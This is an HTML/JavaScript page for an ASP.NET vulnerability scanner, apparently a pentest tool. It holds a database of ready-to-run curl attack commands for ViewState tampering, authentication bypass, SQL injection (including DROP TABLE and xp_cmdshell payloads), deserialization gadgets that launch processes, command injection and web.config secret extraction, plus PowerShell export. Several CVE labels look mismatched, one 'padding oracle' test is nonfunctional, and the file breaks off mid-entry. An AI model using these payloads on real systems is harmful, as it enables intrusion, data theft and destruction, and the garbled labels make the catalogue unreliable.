<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASP.NET Security Testing Framework - Professional Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary: #3b82f6;
            --secondary: #64748b;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --info: #06b6d4;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f8fafc;
            color: #1e293b;
        }

        .header {
            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
            color: white;
            padding: 2rem 0;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .card {
            background: white;
            border-radius: 12px;
            border: 1px solid #e2e8f0;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
            transition: all 0.2s ease;
        }

        .card:hover {
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            border-color: var(--primary);
        }

        .test-card {
            background: white;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            transition: all 0.2s ease;
            position: relative;
        }

        .test-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
            border-color: var(--primary);
        }

        .test-card.selected {
            border-color: var(--primary);
            background: linear-gradient(to right, #eff6ff, #ffffff);
        }

        .test-card.selected::before {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            width: 4px;
            background: var(--primary);
        }

        .severity-critical {
            background: #fef2f2;
            color: #dc2626;
            border: 1px solid #fecaca;
        }

        .severity-high {
            background: #fff7ed;
            color: #ea580c;
            border: 1px solid #fed7aa;
        }

        .severity-medium {
            background: #fffbeb;
            color: #d97706;
            border: 1px solid #fde68a;
        }

        .severity-low {
            background: #f0fdf4;
            color: #16a34a;
            border: 1px solid #bbf7d0;
        }

        .severity-info {
            background: #f0f9ff;
            color: #0284c7;
            border: 1px solid #bae6fd;
        }

        .code-block {
            background: #0f172a;
            color: #e2e8f0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.5;
            padding: 16px;
            border-radius: 8px;
            overflow-x: auto;
            position: relative;
            border: 1px solid #1e293b;
        }

        .code-block .cmd {
            color: #22d3ee;
        }

        .code-block .url {
            color: #a78bfa;
        }

        .code-block .param {
            color: #fbbf24;
        }

        .copy-btn {
            position: absolute;
            top: 8px;
            right: 8px;
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.3);
            color: #3b82f6;
            padding: 6px 10px;
            border-radius: 4px;
            font-size: 11px;
            cursor: pointer;
            opacity: 0;
            transition: all 0.2s ease;
        }

        .code-block:hover .copy-btn {
            opacity: 1;
        }

        .copy-btn:hover {
            background: rgba(59, 130, 246, 0.2);
        }

        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 16px;
            border-radius: 6px;
            font-weight: 500;
            font-size: 14px;
            border: none;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
        }

        .btn-primary {
            background: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background: #2563eb;
            transform: translateY(-1px);
        }

        .btn-secondary {
            background: white;
            color: #475569;
            border: 1px solid #d1d5db;
        }

        .btn-secondary:hover {
            background: #f8fafc;
            border-color: #9ca3af;
        }

        .btn-success {
            background: var(--success);
            color: white;
        }

        .btn-success:hover {
            background: #059669;
        }

        .btn-danger {
            background: var(--danger);
            color: white;
        }

        .btn-danger:hover {
            background: #dc2626;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 32px;
        }

        .stat-card {
            background: white;
            padding: 24px;
            border-radius: 12px;
            border: 1px solid #e2e8f0;
            text-align: center;
            transition: all 0.2s ease;
        }

        .stat-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
        }

        .filter-chip {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 8px 16px;
            background: #f1f5f9;
            border: 1px solid #e2e8f0;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .filter-chip:hover {
            background: #e2e8f0;
        }

        .filter-chip.active {
            background: var(--primary);
            color: white;
            border-color: var(--primary);
        }

        .category-section {
            margin-bottom: 3rem;
        }

        .category-header {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 2px solid #e2e8f0;
        }

        .category-icon {
            width: 56px;
            height: 56px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 16px 20px;
            border-radius: 8px;
            color: white;
            font-weight: 500;
            z-index: 1000;
            transform: translateX(100%);
            transition: transform 0.3s ease;
        }

        .notification.show {
            transform: translateX(0);
        }

        .notification.success { background: var(--success); }
        .notification.error { background: var(--danger); }
        .notification.info { background: var(--info); }
        .notification.warning { background: var(--warning); }

        .progress-ring {
            width: 40px;
            height: 40px;
        }

        .progress-ring circle {
            fill: none;
            stroke-width: 4;
            stroke-linecap: round;
            transform-origin: 50% 50%;
            transform: rotate(-90deg);
        }

        .progress-ring .bg {
            stroke: #e5e7eb;
        }

        .progress-ring .progress {
            stroke: var(--primary);
            stroke-dasharray: 0 100;
            transition: stroke-dasharray 0.3s ease;
        }

        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .test-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="max-w-7xl mx-auto px-6">
            <div class="flex items-center justify-between">
                <div>
                    <h1 class="text-3xl font-bold mb-2">ASP.NET Security Testing Framework</h1>
                    <p class="text-xl text-slate-300">Professional Edition - Comprehensive Vulnerability Assessment</p>
                </div>
                <div class="flex items-center gap-4">
                    <div class="bg-white/10 backdrop-blur-sm rounded-lg px-4 py-2">
                        <div class="flex items-center gap-2">
                            <div class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                            <span>Ready</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="max-w-7xl mx-auto px-6 py-8">
        
        <!-- Configuration Panel -->
        <div class="card p-6 mb-8">
            <h2 class="text-xl font-semibold mb-4">Target Configuration</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4 mb-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Target URL</label>
                    <input type="text" id="targetUrl" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="https://target.com" value="https://target.com">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Framework</label>
                    <select id="framework" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500">
                        <option value="webforms">Web Forms</option>
                        <option value="mvc">MVC</option>
                        <option value="core">ASP.NET Core</option>
                        <option value="blazor">Blazor</option>
                        <option value="api">Web API</option>
                    </select>
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Authentication</label>
                    <input type="text" id="authCookie" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500" placeholder="ASP.NET_SessionId=...">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Scan Mode</label>
                    <select id="scanMode" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500">
                        <option value="safe">Safe</option>
                        <option value="normal">Normal</option>
                        <option value="aggressive">Aggressive</option>
                    </select>
                </div>
                <div class="flex items-end">
                    <button class="btn btn-primary w-full" onclick="testConnection()">
                        <i class="fas fa-link"></i>
                        Test Connection
                    </button>
                </div>
            </div>
        </div>

        <!-- Statistics -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="text-3xl font-bold text-red-600 mb-2" id="criticalCount">0</div>
                <div class="text-sm text-gray-600 uppercase tracking-wide">Critical</div>
            </div>
            <div class="stat-card">
                <div class="text-3xl font-bold text-orange-600 mb-2" id="highCount">0</div>
                <div class="text-sm text-gray-600 uppercase tracking-wide">High</div>
            </div>
            <div class="stat-card">
                <div class="text-3xl font-bold text-yellow-600 mb-2" id="mediumCount">0</div>
                <div class="text-sm text-gray-600 uppercase tracking-wide">Medium</div>
            </div>
            <div class="stat-card">
                <div class="text-3xl font-bold text-green-600 mb-2" id="lowCount">0</div>
                <div class="text-sm text-gray-600 uppercase tracking-wide">Low</div>
            </div>
            <div class="stat-card">
                <div class="text-3xl font-bold text-blue-600 mb-2" id="selectedCount">0</div>
                <div class="text-sm text-gray-600 uppercase tracking-wide">Selected</div>
            </div>
        </div>

        <!-- Controls -->
        <div class="card p-6 mb-8">
            <div class="flex flex-wrap items-center justify-between gap-4">
                <div class="flex flex-wrap gap-3">
                    <button class="btn btn-primary" onclick="selectCritical()">
                        <i class="fas fa-exclamation-triangle"></i>
                        Critical Only
                    </button>
                    <button class="btn btn-primary" onclick="selectAll()">
                        <i class="fas fa-check-double"></i>
                        Select All
                    </button>
                    <button class="btn btn-secondary" onclick="deselectAll()">
                        <i class="fas fa-times"></i>
                        Clear All
                    </button>
                    <button class="btn btn-success" onclick="exportScript()">
                        <i class="fas fa-download"></i>
                        Export PowerShell
                    </button>
                    <button class="btn btn-danger" onclick="runScan()" id="scanBtn">
                        <i class="fas fa-play"></i>
                        Start Scan
                    </button>
                </div>
                
                <div class="flex flex-wrap gap-2">
                    <div class="filter-chip active" data-filter="all" onclick="filterTests('all')">
                        All <span class="bg-white/20 rounded-full px-2 text-xs" id="allCount">0</span>
                    </div>
                    <div class="filter-chip" data-filter="critical" onclick="filterTests('critical')">
                        Critical <span class="bg-white/20 rounded-full px-2 text-xs" id="criticalFilterCount">0</span>
                    </div>
                    <div class="filter-chip" data-filter="high" onclick="filterTests('high')">
                        High <span class="bg-white/20 rounded-full px-2 text-xs" id="highFilterCount">0</span>
                    </div>
                    <div class="filter-chip" data-filter="medium" onclick="filterTests('medium')">
                        Medium <span class="bg-white/20 rounded-full px-2 text-xs" id="mediumFilterCount">0</span>
                    </div>
                    <div class="filter-chip" data-filter="low" onclick="filterTests('low')">
                        Low <span class="bg-white/20 rounded-full px-2 text-xs" id="lowFilterCount">0</span>
                    </div>
                </div>
            </div>
            
            <div class="mt-4">
                <input type="text" id="searchInput" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500" placeholder="Search tests, CVEs, techniques..." onkeyup="searchTests()">
            </div>
        </div>

        <!-- Test Categories -->
        <div id="testCategories"></div>
    </div>

    <!-- Export Modal -->
    <div id="exportModal" class="fixed inset-0 bg-black/50 hidden z-50 flex items-center justify-center p-4">
        <div class="bg-white rounded-lg w-full max-w-4xl max-h-[90vh] flex flex-col">
            <div class="p-6 border-b">
                <div class="flex justify-between items-center">
                    <h3 class="text-xl font-semibold">Generated PowerShell Script</h3>
                    <button onclick="closeModal()" class="text-gray-400 hover:text-gray-600">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
            </div>
            <div class="p-6 flex-1 overflow-auto">
                <div class="flex gap-3 mb-4">
                    <button class="btn btn-primary" onclick="copyScript()">
                        <i class="fas fa-copy"></i>
                        Copy Script
                    </button>
                    <button class="btn btn-secondary" onclick="downloadScript()">
                        <i class="fas fa-download"></i>
                        Download
                    </button>
                </div>
                <div class="code-block">
                    <pre id="scriptOutput"></pre>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Comprehensive ASP.NET Security Test Database
        const testDatabase = {
            'ViewState Vulnerabilities': {
                icon: 'fas fa-eye',
                color: 'bg-blue-500',
                tests: [
                    {
                        id: 'vs001',
                        name: 'ViewState MAC Validation Bypass',
                        severity: 'critical',
                        cve: 'CVE-2010-3332',
                        description: 'Tests if ViewState MAC validation can be bypassed to inject malicious data',
                        command: 'curl -X POST "{{URL}}/Default.aspx" -d "__VIEWSTATE=/wEPDwUKMTIzNDU2Nzg5MGRk&__VIEWSTATEGENERATOR=CA0B0334" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'vs002',
                        name: 'ViewState Padding Oracle Attack',
                        severity: 'critical',
                        cve: 'CVE-2010-3332',
                        description: 'Exploits CBC padding validation to decrypt encrypted ViewState data through timing analysis',
                        command: 'for i in {0..255}; do curl -X POST "{{URL}}/Default.aspx" -d "__VIEWSTATE=test$i" -w "Byte $i: %{time_total}s\\n" -o /dev/null -s; done | sort -k3 -n'
                    },
                    {
                        id: 'vs003',
                        name: 'ViewState Deserialization RCE',
                        severity: 'critical',
                        cve: 'CVE-2019-0604',
                        description: 'Tests for unsafe ViewState deserialization leading to remote code execution',
                        command: 'curl -X POST "{{URL}}/Default.aspx" -d "__VIEWSTATE=MALICIOUS_SERIALIZED_PAYLOAD" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'vs004',
                        name: 'EventValidation Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests if EventValidation can be bypassed to trigger unauthorized server events',
                        command: 'curl -X POST "{{URL}}/Default.aspx" -d "__EVENTTARGET=ctl00$AdminButton&__EVENTARGUMENT=" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'vs005',
                        name: 'ViewState Information Disclosure',
                        severity: 'medium',
                        cve: '',
                        description: 'Attempts to extract sensitive application information from ViewState structure',
                        command: 'curl "{{URL}}/Default.aspx" | grep -oP "__VIEWSTATE\\" value=\\"\\K[^\\"]+" | base64 -d | xxd'
                    },
                    {
                        id: 'vs006',
                        name: 'ViewState Cross-Application Attack',
                        severity: 'high',
                        cve: '',
                        description: 'Tests if ViewState from one application can be used in another with shared machine keys',
                        command: 'curl "{{URL}}/app1/Default.aspx" | grep -oP "__VIEWSTATE\\" value=\\"\\K[^\\"]+" > vs.tmp && curl -X POST "{{URL}}/app2/Default.aspx" -d "__VIEWSTATE=$(cat vs.tmp)" -v'
                    },
                    {
                        id: 'vs007',
                        name: 'ViewState Replay Attack',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests ViewState replay across different sessions to detect session binding issues',
                        command: 'curl "{{URL}}/Default.aspx" -c session1.txt | grep -oP "__VIEWSTATE\\" value=\\"\\K[^\\"]+" > vs.tmp && curl -X POST "{{URL}}/Default.aspx" -b "ASP.NET_SessionId=newsession" -d "__VIEWSTATE=$(cat vs.tmp)" -v'
                    },
                    {
                        id: 'vs008',
                        name: 'ViewState Size-based DoS',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests application resilience against oversized ViewState payloads causing memory exhaustion',
                        command: 'curl -X POST "{{URL}}/Default.aspx" -d "__VIEWSTATE=$(python3 -c "import base64; print(base64.b64encode(b\'A\'*1000000).decode())")" --max-time 30 -v'
                    }
                ]
            },

            'Authentication Bypass': {
                icon: 'fas fa-user-times',
                color: 'bg-red-500',
                tests: [
                    {
                        id: 'auth001',
                        name: 'ASP.NET Core Authentication Bypass (CVE-2025-24070)',
                        severity: 'critical',
                        cve: 'CVE-2025-24070',
                        description: 'Tests elevation of privilege vulnerability in ASP.NET Core RefreshSignInAsync method',
                        command: 'curl -X POST "{{URL}}/Account/RefreshSignIn" -H "Content-Type: application/json" -d \'{"userId":"admin","isPersistent":true}\' -v'
                    },
                    {
                        id: 'auth002',
                        name: 'Path Traversal Authentication Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Bypasses authentication using directory traversal and path manipulation techniques',
                        command: 'curl "{{URL}}/admin/../public/../admin/Dashboard.aspx" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth003',
                        name: 'URL Encoding Authentication Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests authentication bypass using various URL encoding techniques',
                        command: 'curl "{{URL}}/admin%2f%2e%2e%2fpublic%2f%2e%2e%2fadmin/Dashboard.aspx" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth004',
                        name: 'HTTP Method Override Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests authentication bypass using HTTP method overrides and verb tampering',
                        command: 'curl -X OPTIONS "{{URL}}/admin/Dashboard.aspx" -H "X-HTTP-Method-Override: GET" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth005',
                        name: 'Header Injection Authentication Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests authentication bypass through custom header injection',
                        command: 'curl "{{URL}}/public.aspx" -H "X-Original-URL: /admin/Dashboard.aspx" -H "X-Rewrite-URL: /admin/Dashboard.aspx" -v'
                    },
                    {
                        id: 'auth006',
                        name: 'Cookie Manipulation Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests authentication bypass through cookie manipulation and injection',
                        command: 'curl "{{URL}}/admin/Dashboard.aspx" -H "Cookie: .ASPXAUTH=; ASP.NET_SessionId=admin_session; .ASPXROLES=Admin" -v'
                    },
                    {
                        id: 'auth007',
                        name: 'Case Sensitivity Bypass',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests if authentication can be bypassed using case variation in URLs',
                        command: 'curl "{{URL}}/ADMIN/DASHBOARD.ASPX" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth008',
                        name: 'Null Byte Authentication Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests authentication bypass using null byte injection in URLs',
                        command: 'curl "{{URL}}/admin%00/Dashboard.aspx" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth009',
                        name: 'Double Slash Bypass',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests authentication bypass using double slashes in URL paths',
                        command: 'curl "{{URL}}//admin/Dashboard.aspx" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth010',
                        name: 'IP Address Spoofing Bypass',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests IP-based authentication bypass using header spoofing',
                        command: 'curl "{{URL}}/admin/Dashboard.aspx" -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -v'
                    }
                ]
            },

            'SQL Injection': {
                icon: 'fas fa-database',
                color: 'bg-orange-500',
                tests: [
                    {
                        id: 'sql001',
                        name: 'Classic SQL Injection in Parameters',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for classic SQL injection in URL parameters and form fields',
                        command: 'curl "{{URL}}/Product.aspx?id=1\'" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'sql002',
                        name: 'Union-based SQL Injection',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for UNION-based SQL injection to extract data from database',
                        command: 'curl "{{URL}}/Product.aspx?id=1+UNION+SELECT+NULL,username,password+FROM+users--" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'sql003',
                        name: 'Blind SQL Injection with Time Delays',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for blind SQL injection using SQL Server WAITFOR DELAY',
                        command: 'curl "{{URL}}/Search.aspx?q=test\'; WAITFOR DELAY \'00:00:05\'; --" -w "Time: %{time_total}s" -o /dev/null -s'
                    },
                    {
                        id: 'sql004',
                        name: 'Boolean-based Blind SQL Injection',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for boolean-based blind SQL injection using conditional responses',
                        command: 'curl "{{URL}}/Login.aspx" -d "username=admin\' AND \'1\'=\'1\' --&password=test" -v'
                    },
                    {
                        id: 'sql005',
                        name: 'Error-based SQL Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for error-based SQL injection to extract information through error messages',
                        command: 'curl "{{URL}}/Product.aspx?id=1+AND+1=CONVERT(INT,@@version)--" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'sql006',
                        name: 'Second-order SQL Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for second-order SQL injection through stored user input',
                        command: 'curl -X POST "{{URL}}/Register.aspx" -d "username=admin\'; DROP TABLE users; --&email=test@test.com&password=test123" -v'
                    },
                    {
                        id: 'sql007',
                        name: 'JSON SQL Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for SQL injection in JSON API endpoints',
                        command: 'curl -X POST "{{URL}}/api/users" -H "Content-Type: application/json" -d \'{"name":"test\' OR 1=1 --","email":"test@test.com"}\' -v'
                    },
                    {
                        id: 'sql008',
                        name: 'XML SQL Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for SQL injection in XML input processing',
                        command: 'curl -X POST "{{URL}}/api/xml" -H "Content-Type: application/xml" -d \'<user><name>test\' OR 1=1 --</name></user>\' -v'
                    },
                    {
                        id: 'sql009',
                        name: 'Stored Procedure SQL Injection',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for SQL injection in stored procedure calls',
                        command: 'curl "{{URL}}/Search.aspx?category=electronics\'; EXEC xp_cmdshell \'whoami\'; --" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'sql010',
                        name: 'NoSQL Injection in MongoDB',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for NoSQL injection vulnerabilities in MongoDB queries',
                        command: 'curl -X POST "{{URL}}/api/users" -H "Content-Type: application/json" -d \'{"username":{"$ne":null},"password":{"$ne":null}}\' -v'
                    }
                ]
            },

            'Deserialization Attacks': {
                icon: 'fas fa-unlink',
                color: 'bg-purple-500',
                tests: [
                    {
                        id: 'deser001',
                        name: 'BinaryFormatter Deserialization RCE',
                        severity: 'critical',
                        cve: 'CVE-2019-0804',
                        description: 'Tests for unsafe BinaryFormatter usage leading to remote code execution',
                        command: 'echo "AAEAAAD/////" | base64 -d | curl -X POST "{{URL}}/api/data" -H "Content-Type: application/octet-stream" --data-binary @- -v'
                    },
                    {
                        id: 'deser002',
                        name: 'JSON.NET TypeNameHandling RCE',
                        severity: 'critical',
                        cve: 'CVE-2019-0464',
                        description: 'Tests for unsafe JSON.NET TypeNameHandling settings allowing code execution',
                        command: 'curl -X POST "{{URL}}/api/json" -H "Content-Type: application/json" -d \'{"$type":"System.Diagnostics.Process, System","StartInfo":{"FileName":"calc.exe"}}\' -v'
                    },
                    {
                        id: 'deser003',
                        name: 'DataContractSerializer Exploitation',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for unsafe DataContractSerializer usage in WCF services',
                        command: 'curl -X POST "{{URL}}/Service.svc" -H "Content-Type: application/xml" -d \'<ObjectDataProvider xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" MethodName="Start"><ObjectDataProvider.ObjectInstance><Process xmlns="clr-namespace:System.Diagnostics;assembly=System" /></ObjectDataProvider.ObjectInstance></ObjectDataProvider>\' -v'
                    },
                    {
                        id: 'deser004',
                        name: 'XMLSerializer Exploitation',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for unsafe XMLSerializer deserialization vulnerabilities',
                        command: 'curl -X POST "{{URL}}/api/xml" -H "Content-Type: application/xml" -d \'<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System],[System.Windows.Data.ObjectDataProvider, PresentationFramework]], System.Data.Services"></root>\' -v'
                    },
                    {
                        id: 'deser005',
                        name: 'JavaScriptSerializer Exploitation',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for unsafe JavaScriptSerializer usage with __type parameter',
                        command: 'curl -X POST "{{URL}}/api/ajax" -H "Content-Type: application/json" -d \'{"__type":"System.Diagnostics.Process, System"}\' -v'
                    },
                    {
                        id: 'deser006',
                        name: 'Session State Deserialization',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for unsafe session state deserialization in custom providers',
                        command: 'curl -X POST "{{URL}}/Default.aspx" -H "Cookie: ASP.NET_SessionId=MALICIOUS_SESSION_DATA" -v'
                    }
                ]
            },

            'Command Injection': {
                icon: 'fas fa-terminal',
                color: 'bg-green-500',
                tests: [
                    {
                        id: 'cmd001',
                        name: 'OS Command Injection via Process.Start',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for OS command injection in System.Diagnostics.Process calls',
                        command: 'curl -X POST "{{URL}}/Tools.aspx" -d "command=ping 127.0.0.1 && whoami" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'cmd002',
                        name: 'PowerShell Command Injection',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for PowerShell command injection in automated scripts',
                        command: 'curl -X POST "{{URL}}/Admin/Scripts.aspx" -d "script=Get-Process; whoami" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'cmd003',
                        name: 'Batch File Command Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for command injection through batch file execution',
                        command: 'curl -X POST "{{URL}}/Backup.aspx" -d "filename=backup.bat && echo malicious > evil.txt" -v'
                    },
                    {
                        id: 'cmd004',
                        name: 'LDAP Command Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for LDAP injection in directory service queries',
                        command: 'curl -X POST "{{URL}}/Login.aspx" -d "username=admin*)(uid=*))(|(uid=*&password=test" -v'
                    },
                    {
                        id: 'cmd005',
                        name: 'XPath Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for XPath injection in XML data processing',
                        command: 'curl -X POST "{{URL}}/Search.aspx" -d "query=test\' or \'1\'=\'1" -H "Content-Type: application/x-www-form-urlencoded" -v'
                    }
                ]
            },

            'Configuration Issues': {
                icon: 'fas fa-cog',
                color: 'bg-yellow-500',
                tests: [
                    {
                        id: 'config001',
                        name: 'Web.config Information Disclosure',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for exposed web.config files containing sensitive configuration data',
                        command: 'curl "{{URL}}/web.config" -v && curl "{{URL}}/Web.config.bak" -v && curl "{{URL}}/web.config.old" -v'
                    },
                    {
                        id: 'config002',
                        name: 'Debug Mode Detection',
                        severity: 'high',
                        cve: '',
                        description: 'Detects if debug mode is enabled in production exposing stack traces',
                        command: 'curl "{{URL}}/NonExistent.aspx" -v 2>&1 | grep -E "compilation debug|Stack Trace|Source Error"'
                    },
                    {
                        id: 'config003',
                        name: 'Custom Errors Disabled',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests if custom errors are disabled exposing detailed error information',
                        command: 'curl "{{URL}}/error.aspx?test=\'" -v 2>&1 | grep -E "Exception|Stack Trace|System\\."'
                    },
                    {
                        id: 'config004',
                        name: 'Machine Key Exposure',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for exposed or weak machine keys in configuration files',
                        command: 'curl "{{URL}}/web.config" -v | grep -E "validationKey|decryptionKey|machineKey"'
                    },
                    {
                        id: 'config005',
                        name: 'Connection String Exposure',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for exposed database connection strings',
                        command: 'curl "{{URL}}/web.config" -v | grep -E "connectionString|server=|password=|uid="'
                    },
                    {
                        id: 'config006',
                        name: 'Sensitive Directory Exposure',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for exposed sensitive application directories',
                        command: 'for dir in App_Data bin App_Code App_GlobalResources App_LocalResources App_Browsers; do curl "{{URL}}/$dir/" -v; done'
                    },
                    {
                        id: 'config007',
                        name: 'Global.asax Exposure',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for exposed Global.asax application files',
                        command: 'curl "{{URL}}/Global.asax" -v && curl "{{URL}}/global.asa" -v'
                    },
                    {
                        id: 'config008',
                        name: 'Packages.config Exposure',
                        severity: 'low',
                        cve: '',
                        description: 'Tests for exposed NuGet packages configuration',
                        command: 'curl "{{URL}}/packages.config" -v'
                    }
                ]
            },

            'HTTP Handlers & Modules': {
                icon: 'fas fa-plug',
                color: 'bg-indigo-500',
                tests: [
                    {
                        id: 'handler001',
                        name: 'WebResource.axd Padding Oracle',
                        severity: 'critical',
                        cve: 'CVE-2010-3332',
                        description: 'Tests for padding oracle vulnerability in WebResource.axd handler',
                        command: 'curl "{{URL}}/WebResource.axd?d=invalid_encrypted_data" -v 2>&1 | grep -E "Padding|Invalid|500|404"'
                    },
                    {
                        id: 'handler002',
                        name: 'ScriptResource.axd Information Disclosure',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for information disclosure in ScriptResource.axd handler',
                        command: 'curl "{{URL}}/ScriptResource.axd?d=&t=ffffffff" -v'
                    },
                    {
                        id: 'handler003',
                        name: 'Trace.axd Information Exposure',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for exposed trace information revealing request/response data',
                        command: 'curl "{{URL}}/trace.axd" -H "X-Forwarded-For: 127.0.0.1" -v'
                    },
                    {
                        id: 'handler004',
                        name: 'ELMAH Error Log Exposure',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for exposed ELMAH error logging interface',
                        command: 'curl "{{URL}}/elmah.axd" -v && curl "{{URL}}/admin/elmah.axd" -v'
                    },
                    {
                        id: 'handler005',
                        name: 'Glimpse Diagnostics Exposure',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for exposed Glimpse diagnostics panel',
                        command: 'curl "{{URL}}/glimpse.axd" -v'
                    },
                    {
                        id: 'handler006',
                        name: 'Health Monitoring Exposure',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for exposed ASP.NET health monitoring endpoints',
                        command: 'curl "{{URL}}/admin/health.axd" -v'
                    },
                    {
                        id: 'handler007',
